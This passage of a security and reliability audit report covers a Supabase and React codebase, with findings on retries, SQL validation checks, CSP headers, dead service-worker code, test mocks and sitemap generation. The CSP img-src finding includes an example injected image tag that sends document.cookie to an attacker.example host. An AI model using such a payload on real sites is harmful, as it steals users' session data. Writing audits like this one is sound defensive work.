### [Medium] discord-fetch retries non-idempotent POST/PUT on 5xx with no idempotency key  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/_shared/discord-fetch.ts:29-31,58-96
- **What breaks:** discordFetch retries any request on 429/5xx up to maxRetries regardless of method (isRetryableStatus + the loop). Discord mutations (role grants via guilds/:id/members/:id/roles, channel messages, invite creation) are POST/PUT/PATCH; a 5xx that Discord actually applied before the response failed gets retried, producing duplicate side effects — double role assignment, duplicate community notifications, multiple invites. No method guard, no idempotency key/nonce.
- **Smallest fix:** Auto-retry idempotent methods (GET/HEAD) only by default; for mutations require explicit opt-in and, where Discord supports it, a nonce/idempotency key, or have callers reconcile after a single attempt.

### [Medium] freescout POST helpers retried on 5xx/network error create duplicate customers and users  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/_shared/freescout.ts:139-227,343-389
- **What breaks:** freescoutFetch retries on network error (line 189-191) and on any 5xx (line 222-224) up to maxAttempts with no method guard. createCustomer and createUser are POST /api/customers and POST /api/users. A 5xx or dropped connection AFTER Freescout created the record triggers a retry that creates a second customer/user — duplicate contacts, and for createUser duplicate mailbox provisioning. Same class of bug as the Discord one but in a separate client that also silently provisions accounts (sendInvite:false).
- **Smallest fix:** Restrict automatic retry to GET; for POST creates, either check-then-create (findCustomerByEmail/findUserByEmail before POST) idempotently or do a single attempt and reconcile.
- _added-in-verification_

### [Medium] framework_validation.sql column-preservation check only validates one of five declared tables  `under-engineering` (CONFIRMED)
- **Where:** supabase/validation/framework_validation.sql:74-107
- **What breaks:** Section 1b's `expected` CTE declares column sets for reference_duties, reference_skills, reference_practices, reference_stakeholders and reference_company_types, but the query hard-filters `AND e.table_name = 'reference_duties'` in both the outer WHERE (line 106) and the NOT EXISTS subquery (line 103, which only ever reads reference_duties). The other four tables are never checked. A dropped CSV column in skills/practices/stakeholders/company_types passes the 'COLUMN PRESERVATION' invariant undetected — while the file is presented as the proof that ingest is lossless.
- **Smallest fix:** Replace the single-table block with a DO/EXECUTE loop over each expected table (or repeat the NOT EXISTS block per table, as the inline comment admits is needed).

### [Medium] framework_validation.sql array-dedup check never executes its query and always fires  `under-engineering` (CONFIRMED)
- **Where:** supabase/validation/framework_validation.sql:126-147
- **What breaks:** Section 2a wraps a `format(...)` that only BUILDS a dedup query string inside `EXISTS (SELECT 1 FROM (SELECT format(...) AS q) s)`. The inner subquery always returns exactly one row (the query text), so EXISTS is always TRUE and an 'array dup' row is emitted for EVERY array column on EVERY run regardless of actual duplicates. The generated SQL is never EXECUTEd. Operators see constant false-positive noise and learn to ignore 2a; the only real dedup coverage is the single static sweep of reference_duties.related_skills (line 149-157).
- **Smallest fix:** Run the generated SQL via EXECUTE inside a DO block, or delete the dead dynamic block and expand the static sweep to every relationship array.

### [Medium] Gemini API key placed in the request URL query string  `security` (CONFIRMED)
- **Where:** supabase/functions/_shared/gemini-embed.ts:24-26
- **What breaks:** geminiEmbedUrl returns `...:embedContent?key=${apiKey}`. Any component that logs the outbound URL on error (a fetch wrapper, an exception carrying the request URL, an upstream proxy access log) leaks the Gemini API key in plaintext. URLs are far more likely to be logged than headers, and this key is shared across techfleet-chat (query) and fleety-embed (ingest).
- **Smallest fix:** Send the key as the x-goog-api-key request header and keep it out of the URL; ensure no logger prints the full URL.

### [Medium] Email 'recipient_hash' uses a reversible 32-bit hash — false PII protection  `security` (CONFIRMED)
- **Where:** supabase/functions/_shared/email/application/enqueue-email.ts:33-34,49-53
- **What breaks:** enqueueEmail emits ops events with recipient_hash = hash(email), where hash() is a 32-bit non-cryptographic rolling hash (h = h*31 + charCode, comment 'just to avoid PII in events'). With ~767 known member emails, anyone with read access to the ops_events sink hashes the full member list once and maps every recipient_hash back to the exact email — the pseudonymization is illusory (and a 32-bit space is trivially brute-forced regardless). Events are treated as PII-free (lower access controls, longer retention, dashboard export) while actually carrying recoverable recipient identity — a GDPR/data-minimization problem.
- **Smallest fix:** Use keyed HMAC-SHA256 with a server-only secret, or store no recipient identifier in events at all.

### [Low] edge-rate-limit.ts spins its own service-role client, bypassing the centralized admin-client  `dependency` (CONFIRMED)
- **Where:** supabase/functions/_shared/edge-rate-limit.ts:19-22
- **What breaks:** admin-client.ts is documented as the ONE place the service-role key is read (so rotation touches one file) and memoizes the client per isolate. edge-rate-limit.ts instead calls createClient(Deno.env.get('SUPABASE_URL')!, Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!) directly on every request — a second key read, un-memoized (no persistSession:false either), re-paying createClient cost per call. Key rotation and the 90-day rotation-age warning in admin-client silently skip this path.
- **Smallest fix:** Use getAdminClient() from admin-client.ts.

### [Low] discord-fetch caps Retry-After at 15s — ignoring Discord's requested backoff risks a Cloudflare ban  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/_shared/discord-fetch.ts:33-45
- **What breaks:** getRetryDelay respects the Retry-After header but clamps it to MAX_RETRY_DELAY_MS = 15_000 (line 38). Discord global/cloudflare rate limits routinely return Retry-After values well above 15s; retrying before the server-requested window (a) wastes all 3 attempts still rate-limited and (b) counts as ignoring Retry-After, which Discord escalates to a temporary Cloudflare IP ban on the whole function's egress. The cap converts a transient 429 into a harder, longer outage across all Discord-dependent functions.
- **Smallest fix:** Do not clamp an explicit Retry-After below the server's value; if a bound is needed, surface a 'retry later' error to the caller rather than hammering before the window.
- _added-in-verification_

### [Low] config.toml comments claim service-role auth accepts JWTs / sb_secret_ tokens it actually rejects  `error-handling` (CONFIRMED)
- **Where:** supabase/config.toml:49,323-325 vs service-role-auth.ts:30-49
- **What breaks:** config.toml annotations for email-dispatcher (line 49 'accepts JWT or sb_secret_* token') and auth-prober (lines 323-325 'accepts both legacy service_role JWTs and opaque sb_secret_* tokens') describe behavior authorizeServiceRoleRequest no longer has: it accepts ONLY a constant-time exact match against SUPABASE_SERVICE_ROLE_KEY (the JWT-claim path was deliberately removed for audit C1). If any cron trigger pokes these verify_jwt=false workers with a service_role JWT that is not byte-identical to the configured key, it now silently 403s and the worker (email dispatch, auth probe) stops — with docs that actively mislead the operator debugging it.
- **Smallest fix:** Correct the config.toml comments to state exact-key-match only, and add a startup/CI assertion that the cron invoker uses the identical SUPABASE_SERVICE_ROLE_KEY.

### [Low] Three hand-rolled constant-time comparators instead of one shared primitive  `under-engineering` (CONFIRMED)
- **Where:** supabase/functions/_shared/internal-auth.ts:6-13; service-role-auth.ts:20-28; freescout.ts:266-271
- **What breaks:** constantTimeEqual, timingSafeEqualStr, and timingSafeEqual are three separate hand-written implementations of the same security-critical comparison. Duplicated crypto invites divergence (one could be edited to early-return or to compare with === in a refactor), each must be independently tested, and two re-encode via TextEncoder on every call. Deno std crypto.timingSafeEqual exists.
- **Smallest fix:** Extract one shared timingSafeEqual (delegating to Deno std) and import it in all three modules.

### [Low] logger redaction recurses with no depth or cycle guard  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/_shared/logger.ts:31-52
- **What breaks:** redactLogValue recurses through arrays (line 42) and objects (line 43-49) with no visited-set or max-depth. A cyclic meta object (common when logging an Error that references a request/response, or an ORM entity with back-references) causes infinite recursion -> RangeError. Because the logger is invoked from catch blocks (logger.error(..., err)), the crash takes out the error handler itself, converting a handled error into an unhandled 500 with no log line at all.
- **Smallest fix:** Cap recursion depth and track seen objects with a WeakSet, replacing cycles/over-depth with '[Circular]'/'[Truncated]'.

### [Low] Per-isolate rate/breaker/concurrency state advertised as fleet-wide protection  `boundary` (CONFIRMED)
- **Where:** supabase/functions/_shared/waf.ts:39,47-63; freescout.ts:57,88; audit.ts:42-43,95-102
- **What breaks:** WAF checkRate (100 req/10s via module-level ipBuckets Map) and freescout MAX_CONCURRENT=8 / BREAKER_THRESHOLD=5 (module-level vars) are per-isolate. Supabase runs many isolates concurrently and recycles them, so the effective limit is (per-isolate limit x live isolate count) and resets on every cold start. The comments frame these as upstream-DoS protection and burst limiting, but at 767+ users across many warm isolates a distributed burst sails past all of them. Ops relies on a guarantee the architecture cannot provide.
- **Smallest fix:** Back anything that must hold fleet-wide with the shared DB limiter (check_edge_rate_limit) or an external store; keep in-memory only as a best-effort local optimization and document it as such.

### [Low] WAF docstring promises body-SQLi scanning and internal-caller skip the code never implements  `under-engineering` (CONFIRMED)
- **Where:** supabase/functions/_shared/waf.ts:8-11,100-163
- **What breaks:** The header/usage comments say the WAF blocks 'SQL-injection patterns in URL or body' (line 10) and 'Skips ... trusted internal calls (service-role bearer matches the env key)' (line 104-105). The code scans only req.url (line 142; body is explicitly NOT consumed per line 107) and contains no isTrustedInternal / service-role check at all (internal-auth.ts exists but is never imported here). Result: (a) a false sense of body-level SQLi protection, and (b) legitimate server-to-server internal callers ARE subjected to the per-IP burst limit and oversize check and can be 429'd/413'd, contrary to the documented contract.
- **Smallest fix:** Delete the false claims, or implement them: gate applyWaf on isTrustedInternal early-return and actually inspect a bounded copy of the body if body scanning is wanted.

### [Low] WAF security-event logging is awaited on every block, amplifying the DoS it detects  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/_shared/waf.ts:65-85,119-160
- **What breaks:** logEvent is documented 'Fire-and-forget; never block on logging' (line 72) but every call site awaits it (await logEvent at lines 120,130,137,144,154,158). Under an attack the WAF blocks many requests, and each blocked request now serializes behind a synchronous INSERT into security_events — turning the WAF into an amplifier that adds DB write latency per malicious request and floods security_events with unbounded rows (table bloat, then the insert itself slows, worsening the stall).
- **Smallest fix:** Actually fire-and-forget (void logEvent(...) without await, or queue/batch) and rate-limit/aggregate identical block events before writing.

### [Low] Compliance sanctions list stores subdivision codes unreachable by alpha-2 country screening  `under-engineering` (PLAUSIBLE)
- **Where:** supabase/functions/_shared/compliance.ts:22-38
- **What breaks:** EMBARGOED_COUNTRIES contains subdivision codes UA-43 (Crimea), UA-14 (Donetsk), UA-09 (Luhansk), but isEmbargoed(countryCode) merely uppercases and does a Set.has() lookup. Geo/IP lookups conventionally return an ISO-3166-1 alpha-2 country ('UA'), which will never equal 'UA-43'. If callers pass country codes (the parameter name and the other entries — CU/IR/KP — imply exactly that), the three disputed-region entries are dead and those sanctioned regions are silently never screened, while the code reads as if they are covered.
- **Smallest fix:** Screen subdivisions against the actual subdivision field the geo provider returns, or drop the region entries and document that only country-level screening is performed; add a test asserting a Crimea-region input is blocked.
- _added-in-verification_

---

## Catch-all: app entry, assets, generated, tests & repo tooling

### [High] Production CSP allows 'unsafe-inline' scripts — XSS mitigation is effectively off  `security` (CONFIRMED)
- **Where:** public/_headers:25 — script-src and script-src-elem both list 'unsafe-inline'
- **What breaks:** Verified: both script-src and script-src-elem include 'unsafe-inline'. Any stored/reflected XSS that slips past ProfileService/DOMPurify sanitization executes freely — inline <script> and inline event handlers run. Across profiles, notifications, chat, and applications for the user base, one sanitizer miss becomes full script execution: session/token theft, admin-action forgery. The CSP backstop provides almost none of its value for scripts.
- **Smallest fix:** Drop 'unsafe-inline' from script-src/script-src-elem; move index.html's inline chunk-reloader and the analytics/cookie snippets to nonce- or hash-based allowances.

### [High] Runtime paging severity depends on a committed generated snapshot with no blocking CI gate to keep it fresh  `ownership` (CONFIRMED)
- **Where:** src/integrations/supabase/audited-invoke.ts:21-25,64-67 (AUTH_CRITICAL from manifest.critical); generator scripts/ci/check-edge-function-coverage.mjs; CI job lint-arch in .github/workflows/ci.yml:387-424
- **What breaks:** Verified and strengthened. auditedInvoke escalates a 404/transport error to severity:error + fingerprint:edge_function_not_deployed (pages admins) ONLY if the function is in the committed manifest's critical set. Two enforcement holes make staleness silent: (1) check-edge-function-coverage.mjs REGENERATES and overwrites the manifest but NEVER diff-asserts the committed src/generated copy against source, so a stale/mismarked committed manifest never fails; (2) that script runs only in the `lint-arch` job which is explicitly labeled INFORMATIONAL: 'does not block merge' (ci.yml:389). So add/rename a critical edge function and forget to regenerate (or mis-annotate it) and a real undeployed-critical 404 logs as warn with no page — exactly the migration-not-applied/PGRST202 outage class in MEMORY. CORRECTION: criticality's two sources (@edge-auth required comment and CRITICAL_FALLBACK) are OR-unioned at generation (line 181), so they don't drift against each other — the real risk is committed-manifest staleness, not two-writer disagreement.
- **Smallest fix:** Add a regenerate-and-diff step that FAILS CI when the committed manifest differs from a fresh generation, and move that check into a merge-blocking job (not informational lint-arch).

### [High] Boot unregisters every service worker + purges caches on every load; push/PWA/offline are permanently dead  `under-engineering` (CONFIRMED)
- **Where:** src/main.tsx:35-42 (getRegistrations().forEach(unregister) + caches.delete every boot); vs public/sw-push.js, public/offline.html, src/components/PWAInstallPrompt.tsx, src/services/push-subscription.service.ts:213-216,250-260
- **What breaks:** Verified. Every boot tears down all SW registrations and caches. Grep confirms NOTHING in src ever calls navigator.serviceWorker.register and there is no vite-plugin-pwa dependency, so the push SW (sw-push.js) is never registered in the first place, and even if it were, boot would nuke it next load. push-subscription.service itself documents isReady() 'returns false on most deployments' (line 213) and subscribe() returns status:'unsupported' when no active SW (line 252-259). Net: the entire push subsystem (sw-push.js, push-config edge fn, push_subscriptions table, VAPID, PushNotificationToggle) is inert — users toggle 'enable push' and silently get nothing. offline.html can never be served and beforeinstallprompt (PWAInstallPrompt) can never fire. Large built-then-abandoned surface plus a broken user-facing promise.
- **Smallest fix:** Decide one way: no SW (delete sw-push.js/offline.html/PWAInstallPrompt/push tables and stop shipping them) OR a real PWA (register a scoped push SW + web manifest and stop unregistering it at boot). Shipping SW-dependent features while nuking SWs every boot is internally contradictory.

### [Medium] CSP img-src allows any HTTPS origin ('https:' wildcard) — a live exfiltration channel  `security` (CONFIRMED)
- **Where:** public/_headers:25 — img-src 'self' data: blob: https: https://…supabase.co
- **What breaks:** img-src contains a bare 'https:' wildcard, so images may load from ANY https host. Combined with the 'unsafe-inline' script hole above, an injected `<img src="https://attacker.example/?d="+document.cookie>` (or a beacon built by injected inline JS) exfiltrates data to an arbitrary origin and the CSP does nothing to stop it. connect-src is tightly allow-listed, but img-src is the open side door.
- **Smallest fix:** Replace 'https:' in img-src with the explicit hosts actually needed (self, data, blob, the Supabase project, and any known CDN); never ship a scheme-wildcard source alongside 'unsafe-inline'.
- _added-in-verification_

### [Medium] Full internal edge-function inventory (incl. verify_jwt:false admin functions) shipped in the client bundle  `security` (CONFIRMED)
- **Where:** src/integrations/supabase/audited-invoke.ts:12 statically imports src/generated/edge-functions.manifest.json (114 functions, incl. admin-purge-auth-user / admin-sign-out-all-users with verify_jwt:false, critical:true)
- **What breaks:** Verified: a runtime module (audited-invoke) does `import manifest from "@/generated/edge-functions.manifest.json"`, so the entire JSON — every internal function name, its verify_jwt flag, kind, and critical flag — is bundled and served to every browser. Anyone opening the JS gets a labeled map of internal edge functions and which ones the platform JWT gate is off for. CORRECTION to the first pass: verify_jwt:false does NOT mean unauthenticated — the repo's documented pattern is that those functions verify the Bearer/admin token in code (see check-edge-function-coverage.mjs:166-176), so this is internal-topology disclosure and a recon aid, not a list of open admin endpoints. Still real info leakage that should not ship.
- **Smallest fix:** Don't import the manifest into client code. Generate a tiny build-time allow-list of just the critical function NAMES the runtime needs, and keep verify_jwt/kind/topology server-side only.

### [Medium] Dead PWA/offline assets shipped to production; sw-push.js references a build plugin that does not exist  `under-engineering` (CONFIRMED)
- **Where:** public/sw-push.js:2 ('imported by vite-plugin-pwa's generated SW' — no vite-plugin-pwa in package.json); public/offline.html; no public/manifest.webmanifest despite CSP manifest-src 'self'; public/_headers:37-40 serves SW headers for sw-push.js
- **What breaks:** Verified. package.json has no vite-plugin-pwa, so the plugin sw-push.js claims imports it does not exist and nothing loads it. public/ contains pwa-192x192.png / pwa-512x512.png and offline.html but NO manifest.webmanifest, so beforeinstallprompt (which needs a manifest + SW) can never fire and offline.html can never be shown (no SW sets a navigateFallback). _headers keeps Service-Worker-Allowed headers for a worker nobody registers. Shipped dead weight that misleads the next engineer into thinking push/PWA/offline work.
- **Smallest fix:** Delete sw-push.js, offline.html, PWAInstallPrompt and the sw-push.js _headers block, or actually wire a PWA plugin + web manifest. Don't leave both halves half-built.

### [Medium] Production Supabase URL and anon key hardcoded in the build smoke test  `ownership` (CONFIRMED)
- **Where:** scripts/post-build-smoke.mjs:7-10 (required = ['https://pzvqxdgoztbfikfuifix.supabase.co','sb_publishable_yKbfQNAnhEEW-9TPII5_Og_8G7gOzm2'])
- **What breaks:** Verified. The env owns the Supabase URL/key, but this script hard-codes a second copy and asserts the bundle contains it. After any Supabase project migration or key rotation, every prod/preview build fails this gate — not because the build is wrong but because a buried constant is stale — and the failure message truncates the value (`.slice(0,24)`), so the cause is non-obvious and blocks all deploys until someone greps the script. (Anon key isn't itself a secret, so this is drift/coupling, not a leak.)
- **Smallest fix:** Assert the bundle matches VITE_SUPABASE_URL / VITE_SUPABASE_PUBLISHABLE_KEY (the same env the build consumes) instead of duplicating literals.

### [Medium] post-build-smoke silently skips the prod-config assertion for any bundle containing a localhost Supabase URL  `error-handling` (CONFIRMED)
- **Where:** scripts/post-build-smoke.mjs:35-43 (isLocalBuild = /127.0.0.1:54321|localhost:54321/.test(jsBundle) → skip required-config check)
- **What breaks:** The prod-config assertion is gated behind a heuristic that inspects the bundle for a localhost Supabase URL. If a production/preview build accidentally bakes the LOCAL (or any wrong) Supabase URL — a misconfigured env, a leaked .env.local, a bad CI var — isLocalBuild flips true and the smoke test SKIPS the very check meant to catch 'prod pointing at the wrong backend', printing 'local/e2e build detected' and passing green. The one misconfiguration this gate exists to catch is the one it waves through.
- **Smallest fix:** Drive the local-vs-prod decision from an explicit build-mode/env flag (e.g. the deploy target), not from grepping the bundle for localhost; when the target is prod, assert prod config unconditionally.
- _added-in-verification_

### [Medium] arch-gate waiver matching uses substring includes() — a short waiver path silently disables a rule tree-wide  `other` (CONFIRMED)
- **Where:** scripts/ci/arch-gate.mjs:105 (isWaived: `return w._re.test(file) || file.includes(w.path)`)
- **What breaks:** Verified. The mechanical gate is the enforcement half of the mandatory architecture gate. isWaived falls back to `file.includes(w.path)`, so a waiver whose path is a short string ('src', 'services', 'auth') matches EVERY file containing that substring and quietly neutralizes a rule across the whole repo — no signal that coverage collapsed. Worse, expiry is optional (line 103 only checks `if (w.expires && …)`), so a waiver with no expiry never lapses. 'The gate passed' can mean 'the gate was waived everywhere.'
- **Smallest fix:** Match waivers by exact path or glob only (drop the `|| file.includes(w.path)` fallback), require a non-empty expiry, and log how many files each waiver suppresses.

### [Medium] arch-gate swallow/empty-catch detectors are narrow and skip SQL — false confidence in the gate  `under-engineering` (CONFIRMED)
- **Where:** scripts/ci/arch-gate.mjs:37 (CODE_EXT has no .sql), :120-121 (swallowReturn only matches return null|false|undefined), package.json:35 (check:architecture runs with --changed)
- **What breaks:** Verified. swallowReturn only flags `catch { return null|false|undefined }`. Real swallows pass unflagged: push-subscription.service returns `false`/typed result objects on failure, generate-sitemap `return []`, and any `catch { return {} }` / bare `return;` / `return DEFAULT`. SQL files are entirely excluded from builtins (CODE_EXT lacks .sql), so the DB layer — the source of the recorded PGRST202 outage — gets no error-path scan. check:architecture is wired as `arch-gate.mjs --changed`, grandfathering all legacy code, so main.tsx's `catch { /* non-fatal */ }` blocks and the like persist unflagged. The gate reports PASS while genuine swallowing remains.
- **Smallest fix:** Broaden swallowReturn to any catch whose body only returns a literal/const with no recover/retry/report; add .sql handling or a dedicated SQL error-path check; periodically run without --changed to surface grandfathered debt.

### [Medium] Shared test setup mock resolves every query to array-shaped success, including .single()/.maybeSingle()  `under-engineering` (CONFIRMED)
- **Where:** src/test/setup.ts:38-114 (global vi.mock of supabase client; makeQuery always resolves {data:[],error:null,count:0}; all auth/functions resolve success)
- **What breaks:** Verified. makeQuery returns a Proxy over `Promise.resolve({data:[],error:null,count:0})` and returns itself for every method, so .single()/.maybeSingle()/.rpc() all resolve to `data:[]` with `error:null`. Real PostgREST .single() returns a single object (and errors on 0/2 rows) and .maybeSingle() returns object-or-null. Any test that transitively imports the client without its own mock runs code like `const {data}=await q.single(); data.foo` against an array, and every error branch (error is always null) goes unexercised — including functions.invoke, which always resolves {data:null,error:null}. Tests go green while production shapes and error paths differ.
- **Smallest fix:** Make the stub honor terminal modifiers (.single()/.maybeSingle() → single object/null) and provide an explicit opt-in for error cases, or fail fast when a data-shaped assertion hits the permissive default.

### [Medium] Sitemap generator swallows DB fetch failure and drops all dynamic project-opening URLs silently  `error-handling` (CONFIRMED)
- **Where:** scripts/generate-sitemap.ts:71-74 (non-ok → console.warn + return []) and :84-88 (catch → console.warn + return [])
- **What breaks:** Verified. fetchDynamicEntries runs at predev/prebuild. A transient Supabase hiccup, a non-2xx, or missing env vars makes it return [] and the build proceeds, emitting a sitemap with ZERO project-opening pages — the highest-value public/SEO content (priority 0.9, changefreq daily). The only signal is a console.warn buried in build logs. Public discoverability of every open role can vanish for a whole deploy cycle with a green build.
- **Smallest fix:** Distinguish 'no openings' from 'fetch failed': on failure, fail the build or reuse the previously committed dynamic entries, and emit a real alert rather than a warn nobody reads.

### [Medium] Sitemap advertises 'slug' URLs while the SPA route and edge function key off ':projectId' — public SEO URLs may all be dead  `ownership` (PLAUSIBLE)
- **Where:** scripts/generate-sitemap.ts:78-83 emits /project-openings/${row.slug}; src/App.tsx:434 route is :projectId; src/pages/ProjectOpeningDetailPage.tsx:124,142 passes the path segment as ?projectId= to public-project-detail
- **What breaks:** The dynamic sitemap builds URLs from the DB column `slug`, but the SPA route param is `:projectId` and the detail page forwards that path segment verbatim as `projectId=<segment>` to the public-project-detail edge function. If that function resolves openings by UUID id (not slug), every advertised public opening URL — the highest-value SEO surface — loads an empty/not-found shell for crawlers and users arriving from search. Two identifier spaces (slug vs projectId) are being treated as one across the sitemap/route/edge boundary with nothing asserting they match.
- **Smallest fix:** Pick one public identifier: either emit the same id the route/edge function resolves by, or make public-project-detail resolve by slug and rename the route param accordingly; add a test that a sitemap URL round-trips to a real detail response.
- _added-in-verification_

### [Low] Sitemap dynamic project-openings query is unbounded — silent truncation at scale  `under-engineering` (PLAUSIBLE)
- **Where:** scripts/generate-sitemap.ts:61-69 (fetch project_openings?select=slug,updated_at&status=eq.published with no limit/range/pagination)
- **What breaks:** The build-time fetch pulls all published openings in one request with no pagination. PostgREST enforces a default max-rows cap server-side, so once published openings exceed that cap the sitemap silently lists only the first page and the rest of the public roles are dropped from SEO — with no error and a green build. Also relies entirely on anon-role RLS to expose exactly the published rows (correct exposure is untested here).
- **Smallest fix:** Page through results with range headers (or an explicit high limit + assertion) until exhausted, and add a sanity check that the emitted dynamic count matches the published-openings count.
- _added-in-verification_

### [Low] Frozen boot block has floating SW/cache promises with no rejection handling  `error-handling` (CONFIRMED)
- **Where:** src/main.tsx:36-41 (getRegistrations().then(...) and caches.keys().then(...) — no .catch)
- **What breaks:** Verified. In privacy modes / hardened browsers, caches and serviceWorker access can reject. These are fire-and-forget promises with no .catch, before installGlobalErrorReporter() on line 44 — a rejection becomes an unhandled promise rejection at startup that the global reporter then captures as client_error noise, polluting the Triage queue other code works to keep clean.
- **Smallest fix:** Wrap each in .catch(() => {}) (or await inside a guarded try) so boot-time SW/cache teardown can never surface as an unhandled rejection.

### [Low] Committed sitemap.xml is a stale duplicate of generator output; static route list lives in two places  `ownership` (CONFIRMED)
- **Where:** public/sitemap.xml (committed, static-only) vs scripts/generate-sitemap.ts:16-49 (staticEntries), overwritten on predev/prebuild
- **What breaks:** Verified. The committed public/sitemap.xml contains only the static routes and none of the dynamic /project-openings/<slug> URLs the generator adds, so it is a misleading artifact that a repo reader takes as truth, and the generator overwrites it every predev/prebuild. A generated file should not also be a hand-committed source.
- **Smallest fix:** Gitignore public/sitemap.xml and generate it at build so generate-sitemap.ts is the single owner.

### [Low] Self-destruct SW broadcasts a cache-purge message with no client-side listener  `under-engineering` (CONFIRMED)
- **Where:** public/sw.js:27 (client.postMessage({type:'TECHFLEET_CACHE_PURGED'})) — grep finds no listener for that message anywhere in src
- **What breaks:** Verified. The eviction SW posts TECHFLEET_CACHE_PURGED to controlled clients, implying a client contract to react, but nothing in src listens (grep clean). The reload relies solely on the SW's own client.navigate(); the message is dead. Not harmful, but a half-implemented contract that misleads maintainers into thinking coordinated purge handling exists.
- **Smallest fix:** Add the intended message handler or delete the postMessage and keep only the client.navigate path.

### [Low] Inconsistent route protection: public opening-detail vs protected list/apply, and reset-password wildcard  `boundary` (CONFIRMED)
- **Where:** src/App.tsx:426-436 (/project-openings list & :438 apply wrapped in ProtectedRoute, but :433-436 /project-openings/:projectId has none); :229 (/reset-password/* matches any subpath)
- **What breaks:** Verified. The openings LIST and APPLY routes require auth but the DETAIL route is public — if intentional (public job posting) it leans entirely on the public-project-detail edge fn / RLS to stay anon-safe; if not, it is an accidental data-exposure gap. /reset-password/* renders the recovery screen for arbitrary subpaths, widening the surface that processes recovery tokens. Both are implicit boundary decisions that are easy to regress.
- **Smallest fix:** Document and test that /project-openings/:projectId is deliberately public and anon-safe at the data layer; constrain /reset-password/* to the specific legacy shapes it must forward rather than matching everything.

---

